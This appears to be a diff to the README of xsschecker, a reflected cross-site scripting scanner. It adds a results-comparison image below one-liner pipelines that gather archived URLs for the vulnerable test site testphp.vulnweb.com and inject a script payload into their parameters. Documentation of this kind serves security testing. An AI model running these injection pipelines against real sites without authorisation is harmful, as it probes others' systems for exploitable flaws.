@@ -48,3 +48,7 @@ echo "testphp.vulnweb.com" | waybackurls | gf xss | uro | qsreplace '"><script>c
 ```
 echo "testphp.vulnweb.com" | waybackurls | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>' -vuln
 ```
+
+## Reflected XSS Oneliner Command1 and Reflected XSS Oneliner Command2 Results Comparison
+![image](https://github.com/rix4uni/xsschecker/assets/72344025/8034668c-42c3-47b1-9fee-5a58c2c96d63)
+
